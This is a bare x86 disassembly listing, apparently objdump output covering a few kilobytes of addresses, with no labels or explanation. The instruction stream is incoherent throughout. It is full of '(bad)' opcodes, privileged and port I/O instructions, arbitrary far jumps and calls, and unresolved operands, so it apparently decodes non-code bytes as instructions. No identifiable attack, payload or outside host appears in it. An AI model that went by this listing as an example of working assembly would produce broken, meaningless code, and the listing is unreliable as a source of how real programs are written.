  416713:	xchg   ch,ch
  416715:	mov    fs,WORD PTR [eax-0x11f3e714]
  41671b:	enter  0x4da,0xd8
  41671f:	xchg   BYTE PTR [eax-0x30],al
  416722:	ficomp DWORD PTR [ebp+eiz*1+0x65d02367]
  416729:	push   ebp
  41672a:	adc    ecx,DWORD PTR [edi+0x73]
  41672d:	lea    ebx,[esi+0x64a659ad]
  416733:	inc    esi
  416734:	ror    DWORD PTR [edi+ebp*1-0x6a],0x22
  416739:	cli    
  41673a:	test   al,0x36
  41673c:	lods   al,BYTE PTR ds:[esi]
  41673d:	inc    ebp
  41673e:	out    dx,eax
  41673f:	xor    eax,0x299fa270
  416744:	push   edi
  416745:	sub    BYTE PTR [ebx],bh
  416747:	mov    esp,DWORD PTR [eax-0x7cba3348]
  41674d:	mov    dl,0xe6
  41674f:	sbb    al,0xc4
  416751:	repz fiadd DWORD PTR [ebx]
  416754:	pushf  
  416755:	and    ch,BYTE PTR [edi-0x10649de3]
  41675b:	(bad)  [esi+esi*8+0x71ecce13]
  416762:	inc    eax
  416763:	mov    edx,0xdb376591
  416768:	jg     0x4166f1
  41676a:	pop    ebx
  41676b:	scas   eax,DWORD PTR es:[edi]
  41676c:	sar    DWORD PTR [eax-0x1c8d0570],cl
  416772:	popf   
  416773:	(bad)  
  416774:	or     DWORD PTR [edi+0x20],ebx
  416777:	pop    esp
  416778:	inc    edx
  416779:	imul   ebx,esi,0xfffffff9
  41677c:	xchg   esi,eax
  41677d:	imul   ebp,edx,0xb3da2022
  416783:	(bad)  [ebx-0x6831e3b9]
  416789:	or     ch,BYTE PTR [edx+0x7e]
  41678c:	daa    
  41678d:	mov    cs,WORD PTR [ecx+ebp*8+0x14]
  416791:	adc    eax,0xa739edac
  416796:	pop    es
  416797:	iret   
  416798:	imul   esp,DWORD PTR ds:0xe743cbc2,0xc0e9284b
  4167a2:	or     ch,BYTE PTR ds:0xac5a183e
  4167a8:	add    DWORD PTR [edi-0x73a361e2],esi
  4167ae:	mov    ds:0x41427ca6,eax
  4167b3:	adc    WORD PTR [edx],bx
  4167b6:	mov    esi,0xa6888966
  4167bb:	out    dx,al
  4167bc:	aad    0x40
  4167be:	jb     0x41680c
  4167c0:	(bad)  
  4167c1:	mov    esi,0xf05cdf2a
  4167c6:	dec    ebx
  4167c7:	add    eax,0x2c23fc1a
  4167cc:	dec    edi
  4167cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ce:	dec    esi
  4167cf:	scas   eax,DWORD PTR es:[edi]
  4167d0:	sub    DWORD PTR [ebx+edx*4+0xe],0x3a16ac85
  4167d8:	mov    ecx,0x66d25dd9
  4167dd:	mov    edi,0x184b45e3
  4167e2:	push   0x5a334199
  4167e7:	retf   
  4167e8:	jnp    0x416818
  4167ea:	jmp    0x41677b
  4167ec:	dec    esi
  4167ed:	xlat   BYTE PTR ds:[ebx]
  4167ee:	and    DWORD PTR es:[ebx*8-0x7ed1da5d],0xf655497a
  4167fa:	sub    ecx,esi
  4167fc:	iret   
  4167fd:	sbb    eax,0x7916dfda
  416802:	shl    DWORD PTR ds:0x3c66d16b,0xb5
  416809:	(bad)  
  41680a:	xrelease xchg DWORD PTR [edx],ecx
  41680d:	lods   al,BYTE PTR ds:[esi]
  41680e:	sbb    al,BYTE PTR [ebp-0x6b2daf1e]
  416814:	int3   
  416815:	out    dx,al
  416816:	pop    es
  416817:	jg     0x41685e
  416819:	push   0xd84193f3
  41681e:	adc    al,0xa7
  416820:	cld    
  416821:	(bad)  
  416822:	jne    0x4167ff
  416824:	in     al,0xe0
  416826:	jns    0x416873
  416828:	push   ecx
  416829:	pop    ebx
  41682a:	adc    al,0x98
  41682c:	popf   
  41682d:	cld    
  41682e:	outs   dx,BYTE PTR ds:[esi]
  41682f:	jecxz  0x416879
  416831:	leave  
  416832:	and    DWORD PTR [edx],esp
  416834:	std    
  416835:	arpl   WORD PTR [ecx+0x46],cx
  416838:	jne    0x41686b
  41683a:	mov    cl,0x99
  41683c:	inc    ecx
  41683d:	cld    
  41683e:	xchg   ebp,eax
  41683f:	cdq    
  416840:	jae    0x4168b1
  416842:	(bad)  
  416844:	div    BYTE PTR [ebx-0x12]
  416847:	fmul   DWORD PTR [ebp+0x79c7a68d]
  41684d:	(bad)  
  41684e:	and    dl,dh
  416850:	in     al,0xf6
  416852:	cmp    BYTE PTR [edi],cl
  416854:	dec    DWORD PTR [eax-0x7]
  416857:	dec    ecx
  416858:	out    dx,al
  416859:	add    eax,DWORD PTR [ebx+eax*4-0x566c5482]
  416860:	or     BYTE PTR [esi],0x26
  416863:	jno    0x416833
  416865:	or     eax,0x1b645b8b
  41686a:	cld    
  41686b:	sbb    DWORD PTR [edi+0x19],esp
  41686e:	ja     0x4168a3
  416870:	lea    ebx,[esi+ecx*8]
  416873:	xchg   esp,eax
  416874:	push   ebp
  416875:	ja     0x416878
  416877:	push   eax
  416878:	inc    eax
  416879:	pusha  
  41687a:	mov    dl,0x6b
  41687c:	imul   ebx,DWORD PTR [esi+0x2c],0x2b
  416880:	aam    0x7
  416882:	xor    eax,0xb63e4211
  416887:	sar    dh,0xd3
  41688a:	jae    0x4168fb
  41688c:	and    ebp,DWORD PTR [ecx-0x291f4d10]
  416892:	mov    ch,0xe1
  416894:	neg    DWORD PTR [ebp+0x785d6db1]
  41689a:	retf   0x42d6
  41689d:	outs   dx,DWORD PTR ds:[esi]
  41689e:	test   eax,0x24753a4
  4168a3:	test   DWORD PTR [esi+0x50],0x3de248e7
  4168aa:	nop
  4168ab:	imul   ebx,DWORD PTR [ebx],0x14
  4168ae:	xchg   DWORD PTR [edx],ecx
  4168b0:	daa    
  4168b1:	iret   
  4168b2:	(bad)  
  4168b3:	daa    
  4168b4:	jno    0x4168a0
  4168b6:	sbb    bl,cl
  4168b8:	test   esi,0x5e8f142d
  4168be:	icebp  
  4168bf:	loope  0x41690a
  4168c1:	scas   al,BYTE PTR es:[edi]
  4168c2:	push   eax
  4168c3:	mov    esp,0xb7976b20
  4168c8:	mov    al,0xa4
  4168ca:	mov    bl,BYTE PTR [ebx-0x2f]
  4168cd:	pop    edi
  4168ce:	cmp    ecx,DWORD PTR [ecx]
  4168d0:	inc    esi
  4168d1:	jle    0x4168a3
  4168d3:	push   ss
  4168d4:	dec    ebp
  4168d5:	xchg   DWORD PTR [eax],ebp
  4168d7:	jne    0x4168f3
  4168d9:	(bad)  
  4168da:	pop    esp
  4168db:	nop
  4168dc:	cmp    BYTE PTR [eax],0xa7
  4168df:	and    dh,dh
  4168e1:	dec    esi
  4168e2:	sub    BYTE PTR [ecx],ah
  4168e4:	inc    eax
  4168e5:	lods   al,BYTE PTR ds:[esi]
  4168e6:	call   0xc65c:0xf8eb4637
  4168ed:	cmp    eax,0xf25633be
  4168f2:	add    al,0x8e
  4168f4:	aam    0xa2
  4168f6:	lock inc ebp
  4168f8:	dec    edi
  4168f9:	mov    ch,0x67
  4168fb:	add    al,0xfb
  4168fd:	jge    0x41689d
  4168ff:	(bad)  
  416900:	dec    ecx
  416901:	mov    DWORD PTR [esi-0x73dfff3c],esi
  416907:	push   edx
  416908:	sub    al,0xca
  41690a:	gs nop
  41690c:	mov    BYTE PTR [esi-0x40],al
  41690f:	aam    0x1a
  416911:	push   0x58
  416913:	pop    ss
  416914:	lods   eax,DWORD PTR ds:[esi]
  416915:	xor    BYTE PTR [ebx-0x776fe696],bl
  41691b:	dec    edx
  41691c:	jecxz  0x4168fb
  41691e:	mov    edx,0xf8bc49a0
  416923:	xchg   edi,eax
  416924:	and    ah,ch
  416926:	bound  ebx,QWORD PTR [edi+ecx*1-0x24818c63]
  41692d:	(bad)  
  41692e:	out    dx,eax
  41692f:	add    DWORD PTR [edx+0x1ba3f24b],esi
  416935:	sbb    BYTE PTR fs:[ebp+edx*4+0x40],dl
  41693a:	fld    TBYTE PTR [ecx]
  41693c:	xor    DWORD PTR ds:0xbf291f50,ebp
  416942:	cmp    al,0x46
  416944:	icebp  
  416945:	ins    BYTE PTR es:[edi],dx
  416946:	frstor [esi-0x56]
  416949:	mov    eax,0xefebceba
  41694e:	call   0xb087:0xac7a23bb
  416955:	cmp    DWORD PTR [eax+0x57],edx
  416958:	das    
  416959:	push   ss
  41695a:	xor    eax,0x8685c6b
  41695f:	xchg   ecx,eax
  416960:	dec    ecx
  416961:	in     al,dx
  416962:	inc    esp
  416963:	(bad)  
  416964:	cmc    
  416965:	pushf  
  416966:	call   0xf0d1:0x93f6a568
  41696d:	sub    eax,0xe4223f8d
  416972:	(bad)  
  416973:	lock rcr DWORD PTR [esi+eax*8],cl
  416977:	xor    DWORD PTR ds:0x412432f7,ebp
  41697d:	xchg   BYTE PTR [ecx],bl
  41697f:	xchg   ecx,eax
  416980:	jno    0x4169b9
  416982:	fdivr  DWORD PTR [esi+esi*4-0x66]
  416986:	hlt    
  416987:	cmc    
  416988:	sti    
  416989:	hlt    
  41698a:	fmul   st(3),st
  41698c:	mov    al,ds:0xd6a3f18c
  416991:	scas   eax,DWORD PTR es:[edi]
  416992:	out    0x3e,eax
  416994:	jle    0x416924
  416996:	xchg   ebx,eax
  416997:	test   eax,0xf9335fa4
  41699c:	shl    DWORD PTR [edx-0x48119ed5],0x9e
  4169a3:	xor    al,0x6d
  4169a5:	xchg   BYTE PTR [ecx+0x64],ch
  4169a8:	pop    ss
  4169a9:	sbb    al,0x8
  4169ab:	int3   
  4169ac:	cmp    al,0xf1
  4169ae:	scas   eax,DWORD PTR es:[edi]
  4169af:	sar    al,0x9c
  4169b2:	fxch   st(2)
  4169b4:	fmulp  st(2),st
  4169b6:	sbb    ch,0xc4
  4169b9:	out    dx,eax
  4169ba:	repnz dec edx
  4169bc:	pushf  
  4169bd:	sbb    DWORD PTR [ecx],edx
  4169bf:	or     eax,0xa25ab15d
  4169c4:	ret    0x2b44
  4169c7:	inc    eax
  4169c8:	pop    ebp
  4169c9:	mov    al,0x63
  4169cb:	test   eax,0x2414c376
  4169d0:	push   edi
  4169d1:	mov    dh,0x34
  4169d3:	add    cl,al
  4169d5:	inc    ebx
  4169d6:	fsubr  QWORD PTR [esp+ecx*2-0xe]
  4169da:	jl     0x416a00
  4169dc:	mov    al,0xdb
  4169de:	mov    esp,0xadd08a26
  4169e3:	test   ch,ah
  4169e5:	sub    al,0x4f
  4169e7:	mov    edx,0x299f57e
  4169ec:	out    dx,al
  4169ed:	shl    BYTE PTR [edi],0x30
  4169f0:	dec    esp
  4169f1:	adc    ah,BYTE PTR [ebx+0x149f9f61]
  4169f7:	loop   0x4169de
  4169f9:	in     al,dx
  4169fa:	xor    eax,0x86068029
  4169ff:	adc    BYTE PTR [esi+ebx*4-0x34a6f0c0],dl
  416a06:	sbb    eax,0xd899e41e
  416a0b:	sub    DWORD PTR [edi],ebp
  416a0d:	push   esi
  416a0e:	inc    esp
  416a0f:	or     eax,0xc703bc8a
  416a14:	hlt    
  416a15:	jmp    0x4169a8
  416a17:	inc    esi
  416a18:	sar    DWORD PTR [esi+0x24c5edb4],0x4a
  416a1f:	loope  0x4169e1
  416a21:	cmp    BYTE PTR [edx+0x5d13effd],al
  416a27:	es leave 
  416a29:	test   al,0x8
  416a2b:	shl    ecx,0xd7
  416a2e:	pop    esi
  416a2f:	push   ebp
  416a30:	imul   ecx,ecx,0xe5c4ae2f
  416a36:	dec    esp
  416a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a38:	outs   dx,BYTE PTR ds:[esi]
  416a39:	xlat   BYTE PTR ds:[ebx]
  416a3a:	(bad)  
  416a3b:	in     al,0xbf
  416a3d:	prefetch BYTE PTR [eax]
  416a40:	sub    BYTE PTR [edx],ch
  416a42:	popa   
  416a43:	adc    ch,BYTE PTR [edx-0x4ca2be31]
  416a49:	call   0xc9a1:0x9bdab087
  416a50:	jmp    0x416a75
  416a52:	pop    esp
  416a53:	aad    0xd6
  416a55:	ret    0x403d
  416a58:	test   al,0x4b
  416a5a:	mov    ebx,0xc920aafb
  416a5f:	adc    eax,0x50d1f10c
  416a64:	test   DWORD PTR [edx],edi
  416a66:	aaa    
  416a67:	mov    ds:0x72d27e09,eax
  416a6c:	ret    
  416a6d:	jbe    0x416a7b
  416a6f:	mov    ds:0xb750b7d3,eax
  416a74:	add    DWORD PTR [ebp+0x1370ca9c],0xf2db7200
  416a7e:	out    dx,al
  416a7f:	(bad)  
  416a80:	into   
  416a81:	jb     0x416a76
  416a83:	xchg   esi,eax
  416a84:	not    esi
  416a86:	loope  0x416a5d
  416a88:	or     al,0xfc
  416a8a:	clc    
  416a8b:	push   ebx
  416a8c:	or     DWORD PTR [ecx+0x54a0e681],ebx
  416a92:	pop    ds
  416a93:	clc    
  416a94:	ja     0x416ac5
  416a96:	nop
  416a97:	inc    eax
  416a98:	add    eax,0x4d45b9f0
  416a9d:	adc    al,BYTE PTR [esp+esi*1+0x3e4d9125]
  416aa4:	mov    eax,ds:0x57148b33
  416aa9:	je     0x416a70
  416aab:	mov    esp,0x5b745b91
  416ab0:	jns    0x416ae0
  416ab2:	loope  0x416ac2
  416ab4:	add    ebp,ebx
  416ab6:	mov    ds,WORD PTR [ecx]
  416ab8:	pop    esp
  416ab9:	ins    DWORD PTR es:[edi],dx
  416aba:	mov    BYTE PTR [ecx+0x4f],cl
  416abd:	adc    eax,0x86cc5da2
  416ac2:	mov    esp,0x2a32aceb
  416ac7:	out    dx,al
  416ac8:	push   esp
  416ac9:	pushf  
  416aca:	test   eax,0x50db3fa3
  416acf:	lods   eax,DWORD PTR ds:[esi]
  416ad0:	adc    BYTE PTR [esi],dh
  416ad2:	xor    dl,cl
  416ad4:	cli    
  416ad5:	ss leave 
  416ad7:	lea    edx,[esi+0x61]
  416ada:	mov    ds,WORD PTR ds:0x14391772
  416ae0:	call   FWORD PTR [ecx+0x7a93a37e]
  416ae6:	dec    edi
  416ae7:	jecxz  0x416b35
  416ae9:	rol    BYTE PTR [ecx-0x2d],cl
  416aec:	pusha  
  416aed:	inc    edi
  416aee:	cmp    ah,bl
  416af0:	(bad)  
  416af1:	dec    ebp
  416af2:	push   edx
  416af3:	xor    DWORD PTR [ecx+0x63],edi
  416af6:	fcom   DWORD PTR [esi+0x1cb4761b]
  416afc:	sbb    dl,BYTE PTR [ecx-0x46d2acfb]
  416b02:	xor    cl,BYTE PTR [edi+0x49]
  416b05:	(bad)  
  416b06:	in     al,0x87
  416b08:	jbe    0x416b34
  416b0a:	cli    
  416b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b0c:	dec    ecx
  416b0d:	mul    DWORD PTR [edx+0x12]
  416b10:	mov    WORD PTR [edx+0x50],?
  416b13:	xchg   esi,eax
  416b14:	xor    eax,0xe65e4805
  416b19:	push   ss
  416b1a:	adc    eax,0x38c1736f
  416b1f:	mov    ebp,0xe919ac44
  416b24:	sub    BYTE PTR [ecx+0x11b40b33],al
  416b2a:	(bad)  
  416b2b:	mov    ebx,0xc11be78d
  416b30:	ror    edx,0x8
  416b33:	loop   0x416b02
  416b35:	mov    bl,0x42
  416b37:	mov    bl,0x4a
  416b39:	iret   
  416b3a:	push   ds
  416b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b3c:	inc    edi
  416b3d:	ins    BYTE PTR es:[edi],dx
  416b3e:	cwde   
  416b3f:	lods   al,BYTE PTR ds:[esi]
  416b40:	or     al,0x82
  416b42:	cli    
  416b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b44:	mov    ecx,0xe1e42b45
  416b49:	pop    ds
  416b4a:	repnz stos BYTE PTR es:[edi],al
  416b4c:	ins    DWORD PTR es:[edi],dx
  416b4d:	jno    0x416b2e
  416b4f:	pop    ebx
  416b50:	stc    
  416b51:	in     eax,0xfa
  416b53:	and    eax,edx
  416b55:	test   DWORD PTR [edi-0x21],0x84f257dc
  416b5c:	retf   0xca40
  416b5f:	jmp    0xfa0f7d53
  416b64:	cmc    
  416b65:	mov    dh,0xe
  416b67:	dec    esp
  416b68:	mov    fs,WORD PTR ds:0xb3281ee
  416b6e:	push   cs
  416b6f:	dec    ebx
  416b70:	mov    cl,BYTE PTR [ecx-0x16]
  416b73:	lock int 0x1c
  416b76:	les    edi,FWORD PTR [ecx]
  416b78:	aas    
  416b79:	inc    eax
  416b7a:	cld    
  416b7b:	push   esi
  416b7c:	sub    bl,cl
  416b7e:	sbb    ebx,DWORD PTR [eax+ebx*8]
  416b81:	enter  0x8489,0x9b
  416b85:	mov    cl,0x13
  416b87:	int    0x8
  416b89:	popf   
  416b8a:	sub    eax,0x18ce8479
  416b8f:	cmc    
  416b90:	lea    eax,[esi]
  416b92:	pushf  
  416b93:	idiv   DWORD PTR [edi-0x41b41cb]
  416b99:	repz dec ebp
  416b9b:	dec    esp
  416b9c:	cld    
  416b9d:	cmp    ebp,DWORD PTR [ebp+0x10]
  416ba0:	(bad)  
  416ba1:	test   eax,0x5f923058
  416ba6:	test   BYTE PTR [eax-0x65],cl
  416ba9:	popa   
  416baa:	push   edx
  416bab:	ins    BYTE PTR es:[edi],dx
  416bac:	pop    ss
  416bad:	xchg   esi,eax
  416bae:	sbb    eax,DWORD PTR [esi-0x23]
  416bb1:	and    bh,bh
  416bb3:	add    edi,ebx
  416bb5:	(bad)  
  416bb6:	ret    0x9381
  416bb9:	mov    al,ds:0xe0b2cb
  416bbe:	sbb    DWORD PTR [eax+0x55a094a4],ebp
  416bc4:	clc    
  416bc5:	mov    bh,BYTE PTR [esi-0x30720262]
  416bcb:	inc    esi
  416bcc:	xchg   BYTE PTR [ecx-0x76635ecc],cl
  416bd2:	lds    edx,FWORD PTR ds:0x68d83dd5
  416bd8:	xor    al,0xa8
  416bda:	out    dx,eax
  416bdb:	shl    DWORD PTR [ecx],0xe4
  416bde:	inc    eax
  416bdf:	fadd   QWORD PTR [edi-0x1a882916]
  416be5:	cwde   
  416be6:	adc    DWORD PTR [eax+0xeaaed26],ecx
  416bec:	sbb    edi,DWORD PTR [ebx]
  416bee:	retf   0x222b
  416bf1:	sahf   
  416bf2:	in     al,dx
  416bf3:	ins    DWORD PTR es:[edi],dx
  416bf4:	ret    
  416bf5:	les    ebp,FWORD PTR ss:[ecx-0x75]
  416bf9:	mov    eax,0x2acbf3fe
  416bfe:	mov    bh,0x66
  416c00:	enter  0xde1f,0xcd
  416c04:	out    dx,al
  416c05:	jmp    0xe315268e
  416c0a:	push   0xffffffe1
  416c0c:	pop    ds
  416c0d:	or     DWORD PTR [edi+0x33],ebp
  416c10:	mov    ?,WORD PTR [eax]
  416c12:	in     eax,dx
  416c13:	scas   al,BYTE PTR es:[edi]
  416c14:	sar    DWORD PTR [ecx+0x35],cl
  416c17:	mov    ebx,esp
  416c19:	sub    al,0x75
  416c1b:	mov    esi,0xca2a7596
  416c20:	(bad)  
  416c21:	dec    esp
  416c22:	inc    ebx
  416c23:	xor    eax,0xf8fa7f82
  416c28:	mov    edx,0x62862b5b
  416c2d:	cmp    al,0xd7
  416c2f:	jmp    FWORD PTR [eax]
  416c31:	jnp    0x416c1d
  416c33:	mov    bh,0xaa
  416c35:	gs in  al,0x17
  416c38:	std    
  416c39:	sub    DWORD PTR [edi+0x65],0x4b
  416c3d:	int3   
  416c3e:	mov    eax,0xfdf0957b
  416c43:	sub    al,0xd7
  416c45:	add    dl,BYTE PTR [edx+0x65602ef4]
  416c4b:	xchg   esi,eax
  416c4c:	mov    ecx,0x99f719b1
  416c51:	or     eax,0x42988e4f
  416c56:	jp     0x416c1e
  416c58:	les    edx,FWORD PTR [ebx+0x5dd666e]
  416c5e:	lock shl ah,0x5d
  416c62:	cmp    bl,al
  416c64:	loop   0x416ce4
  416c66:	out    dx,al
  416c67:	iret   
  416c68:	mov    al,ds:0xe14d078c
  416c6d:	or     BYTE PTR [ebp+0x2ff36c1c],dl
  416c73:	add    al,cl
  416c75:	mov    DWORD PTR ds:[ebx-0x5cfc4611],edi
  416c7c:	jl     0x416c4b
  416c7e:	add    bh,bl
  416c80:	xor    al,0xf
  416c82:	push   ecx
  416c83:	cld    
  416c84:	inc    eax
  416c85:	inc    edx
  416c86:	out    dx,eax
  416c87:	push   cs
  416c88:	push   ebp
  416c89:	jge    0x416c10
  416c8b:	pop    ds
  416c8c:	mov    bh,0xd1
  416c8e:	loop   0x416cd2
  416c90:	jp     0x416c98
  416c92:	inc    ebx
  416c93:	and    dh,dl
  416c95:	inc    edx
  416c96:	shl    BYTE PTR [eax-0x5a19de7f],1
  416c9c:	xor    BYTE PTR [ebx+edi*8],0xa2
  416ca0:	rcr    DWORD PTR [edx+edx*4],1
  416ca3:	ja     0x416c34
  416ca5:	pop    es
  416ca6:	pop    ebx
  416ca7:	test   BYTE PTR [ebx+0x39a39692],ah
  416cad:	je     0x416c44
  416caf:	jo     0x416cba
  416cb1:	out    dx,eax
  416cb2:	ins    BYTE PTR es:[edi],dx
  416cb3:	neg    ebx
  416cb5:	nop
  416cb6:	sbb    eax,0xdf4a1b29
  416cbb:	mov    ebx,0x8e058980
  416cc0:	fmul   st(2),st
  416cc2:	inc    esi
  416cc3:	inc    ebp
  416cc4:	adc    eax,0xd16f794
  416cc9:	dec    esp
  416cca:	mov    ecx,0xb1b96399
  416ccf:	ror    DWORD PTR [esi+0x35],0xc6
  416cd3:	fisttp QWORD PTR [ebp+0x6215bb8a]
  416cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cda:	add    ebx,ecx
  416cdc:	jmp    0x416d16
  416cde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cdf:	pusha  
  416ce0:	and    dl,al
  416ce2:	leave  
  416ce3:	fsub   DWORD PTR [ebx]
  416ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ce6:	and    ch,cl
  416ce8:	xor    ah,BYTE PTR [eax+0x13]
  416ceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cec:	fst    DWORD PTR [esi-0x2f]
  416cef:	(bad)  
  416cf0:	xor    dl,BYTE PTR [ecx]
  416cf2:	sub    BYTE PTR [edx+0x3b],ch
  416cf5:	jnp    0x416cb0
  416cf7:	cmc    
  416cf8:	add    cl,BYTE PTR [eax+0x5f]
  416cfb:	mov    dl,0x2e
  416cfd:	sub    bl,dh
  416cff:	out    dx,al
  416d00:	add    bh,BYTE PTR ds:0xe7789dba
  416d06:	aad    0x99
  416d08:	sbb    al,0x9b
  416d0a:	scas   eax,DWORD PTR es:[edi]
  416d0b:	jle    0x416d76
  416d0d:	cmp    eax,0x4ac3d661
  416d12:	fnstsw WORD PTR [eax+0x55]
  416d15:	adc    al,BYTE PTR [ebp+0x7f7c77b0]
  416d1b:	repz (bad) 
  416d1d:	data16 sub bh,ah
  416d20:	test   DWORD PTR [ecx+0x1d5d1e63],ecx
  416d26:	fwait
  416d27:	stc    
  416d28:	lods   eax,DWORD PTR ds:[esi]
  416d29:	mov    DWORD PTR [esi+eiz*1+0x7ebf51a],0x957b2f8f
  416d34:	jmp    0x4c73:0xd5db2b8f
  416d3b:	(bad)  
  416d3c:	jl     0x416cf3
  416d3e:	xchg   BYTE PTR [ebp-0x58],al
  416d41:	mov    cl,0x2b
  416d43:	dec    esp
  416d44:	(bad)  
  416d45:	adc    eax,eax
  416d47:	cmc    
  416d48:	cli    
  416d49:	jmp    0x416da3
  416d4b:	jge    0x416dbc
  416d4d:	pushf  
  416d4e:	out    0x3c,al
  416d50:	cs mov bh,0x1
  416d53:	shl    DWORD PTR [edi],0x55
  416d56:	jbe    0x416d0e
  416d58:	addr16 (bad) 
  416d5a:	jno    0x416db4
  416d5c:	xchg   cx,ax
  416d5e:	scas   al,BYTE PTR es:[edi]
  416d5f:	jmp    0x416d8b
  416d61:	fidivr DWORD PTR [ecx+0x6b]
  416d64:	cmp    DWORD PTR [esi+0x1bbcd70c],ecx
  416d6a:	mov    esp,0x48e28248
  416d6f:	ins    DWORD PTR es:[edi],dx
  416d70:	int    0x69
  416d72:	(bad)  
  416d73:	std    
  416d74:	scas   eax,DWORD PTR es:[edi]
  416d75:	add    ah,bh
  416d77:	jl     0x416d4f
  416d79:	cmp    ebx,ebp
  416d7b:	jnp    0x416dcc
  416d7d:	loope  0x416dec
  416d7f:	xchg   ecx,eax
  416d80:	(bad)  
  416d81:	cmp    ah,al
  416d83:	adc    BYTE PTR [esi+0x6c],al
  416d86:	lock int 0x78
  416d89:	int    0xd6
  416d8b:	(bad)  
  416d8c:	xchg   ebp,eax
  416d8d:	sub    bh,0x8b
  416d90:	pop    edi
  416d91:	push   es
  416d92:	jmp    0x7c87:0xb882f174
  416d99:	leave  
  416d9a:	nop
  416d9b:	mov    WORD PTR ds:0x867295a8,ss
  416da1:	or     BYTE PTR [eax+0x2a],al
  416da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da5:	inc    edi
  416da6:	cld    
  416da7:	and    eax,0x4c508b4e
  416dac:	jmp    0x6e9ff3c9
  416db1:	or     al,0x94
  416db3:	add    ch,ah
  416db5:	fsubr  st(3),st
  416db7:	cmp    bh,BYTE PTR [ebp+0x17d979bd]
  416dbd:	xchg   ebx,eax
  416dbe:	xchg   esp,eax
  416dbf:	inc    ebp
  416dc0:	lock clc 
  416dc2:	xchg   edi,eax
  416dc3:	push   es
  416dc4:	scas   eax,DWORD PTR es:[edi]
  416dc5:	cmp    BYTE PTR [esi+0xd9ee258],al
  416dcb:	jae    0x416e40
  416dcd:	arpl   WORD PTR [ebx-0x15],ax
  416dd0:	mov    edx,0x832296f
  416dd5:	lods   al,BYTE PTR ds:[esi]
  416dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dd7:	cdq    
  416dd8:	call   FWORD PTR [eax+0x0]
  416ddb:	jecxz  0x416db7
  416ddd:	jmp    0xa246:0x65f43007
  416de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de5:	sub    ah,BYTE PTR [ebp-0x657b38a8]
  416deb:	aaa    
  416dec:	jmp    0x416dda
  416dee:	push   0xd0bc1de2
  416df3:	xchg   ebp,eax
  416df4:	sahf   
  416df5:	jge    0x416d83
  416df7:	addr16 pop edx
  416df9:	mov    edx,0x29a0601c
  416dfe:	je     0x416e16
  416e00:	and    BYTE PTR [esi],bh
  416e02:	cmp    BYTE PTR [edi+0x120e2c13],al
  416e08:	mov    esi,DWORD PTR [esi-0x375f4a7c]
  416e0e:	popf   
  416e0f:	adc    ecx,DWORD PTR [ecx+0x3170b419]
  416e15:	xor    DWORD PTR [eax-0x2a],esi
  416e18:	das    
  416e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e1a:	fnstenv [ebx]
  416e1c:	dec    BYTE PTR [edx]
  416e1e:	stos   BYTE PTR es:[edi],al
  416e1f:	mov    dh,0x8f
  416e21:	xchg   edi,edi
  416e23:	pop    ss
  416e24:	mov    dh,0x41
  416e26:	retf   
  416e27:	cld    
  416e28:	mov    ebx,0xefe13b6c
  416e2d:	sbb    cl,BYTE PTR [esi-0x69572fd9]
  416e33:	inc    edi
  416e34:	jbe    0x416e8e
  416e36:	xchg   edx,eax
  416e37:	shl    DWORD PTR [eax],cl
  416e39:	pop    edi
  416e3a:	or     DWORD PTR [ecx+0x62f4b42e],ebp
  416e40:	test   BYTE PTR [esi],0xe9
  416e43:	test   DWORD PTR [edx],esp
  416e45:	jo     0x416de5
  416e47:	pop    ecx
  416e48:	push   edx
  416e49:	xor    al,0x2e
  416e4b:	cmp    ah,BYTE PTR [esi+eiz*2-0x4a]
  416e4f:	fwait
  416e50:	push   eax
  416e51:	pushf  
  416e52:	aas    
  416e53:	aam    0x59
  416e55:	or     al,0x7d
  416e58:	in     eax,dx
  416e59:	mov    al,0xa4
  416e5b:	out    0x89,eax
  416e5d:	test   BYTE PTR [ecx+0x7f],bh
  416e60:	sti    
  416e61:	mov    esi,?
  416e63:	(bad)  
  416e64:	(bad)  
  416e65:	and    DWORD PTR [eax],esp
  416e67:	cmp    ecx,esi
  416e69:	mov    ecx,0x80f7fd55
  416e6e:	add    DWORD PTR [ecx-0x4f],0xffffffe2
  416e72:	adc    BYTE PTR [ecx],al
  416e74:	or     eax,0xa6b25ce7
  416e79:	outs   dx,BYTE PTR ds:[esi]
  416e7a:	(bad)  
  416e7c:	je     0x416e71
  416e7e:	(bad)  
  416e7f:	xor    DWORD PTR [ecx-0x59693a6],eax
  416e85:	ss jp  0x416e27
  416e88:	in     eax,dx
  416e89:	ss sub al,0x22
  416e8c:	mov    ah,0x25
  416e8e:	and    eax,0x36eafcd5
  416e93:	ja     0x416ef6
  416e95:	push   edx
  416e96:	fs sbb al,0x68
  416e99:	adc    BYTE PTR [ebp+0x32],ah
  416e9c:	push   0x2
  416e9e:	pop    ebx
  416e9f:	inc    esp
  416ea0:	aad    0xb6
  416ea2:	in     eax,0x55
  416ea4:	or     al,0xe9
  416ea6:	sbb    ecx,0xffffffcc
  416ea9:	rcl    DWORD PTR [edi-0xb],cl
  416eac:	shl    BYTE PTR [ecx-0x5d],1
  416eaf:	jmp    eax
  416eb1:	dec    edi
  416eb2:	int    0x4a
  416eb4:	mov    esp,DWORD PTR [edx-0x25]
  416eb7:	out    dx,eax
  416eb8:	ret    0x9974
  416ebb:	xchg   edi,eax
  416ebc:	xor    cl,bl
  416ebe:	outs   dx,DWORD PTR ds:[esi]
  416ebf:	pop    ebp
  416ec0:	lds    edi,FWORD PTR [eax]
  416ec2:	inc    esi
  416ec3:	jns    0x416ebf
  416ec5:	adc    dl,BYTE PTR [ebp-0x586cefaa]
  416ecb:	add    al,0xa2
  416ecd:	add    eax,0x8e2c86d2
  416ed2:	imul   ebp,DWORD PTR [edi],0x19
  416ed5:	adc    ebp,edi
